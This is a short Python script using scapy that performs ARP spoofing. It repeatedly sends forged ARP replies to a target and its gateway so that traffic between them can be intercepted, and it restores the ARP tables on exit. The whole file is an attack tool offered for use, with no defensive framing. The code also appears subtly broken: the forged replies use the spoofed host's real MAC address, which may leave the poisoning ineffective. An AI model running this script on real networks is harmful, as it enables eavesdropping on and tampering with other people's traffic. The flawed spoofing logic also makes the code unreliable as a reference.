# arp_spoof.py

import scapy.all as scapy
import time
import sys

# Function to get the MAC address of a device
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

# Function to perform the ARP spoofing
def arp_spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    scapy.send(arp_response, verbose=False)

# Function to restore the network after the attack
def restore_network(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    arp_response_target = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    arp_response_gateway = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
    
    scapy.send(arp_response_target, count=4, verbose=False)
    scapy.send(arp_response_gateway, count=4, verbose=False)
    print("Network restored.")

# Main function to run the ARP spoofing attack
def main():
    if len(sys.argv) != 3:
        print("Usage: python arp_spoof.py <Target IP> <Gateway IP>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    
    print("Starting ARP Spoofing Attack...")
    try:
        while True:
            arp_spoof(target_ip, gateway_ip)
            arp_spoof(gateway_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nStopping ARP Spoofing...")
        restore_network(target_ip, gateway_ip)
        sys.exit(0)

if __name__ == "__main__":
    main()

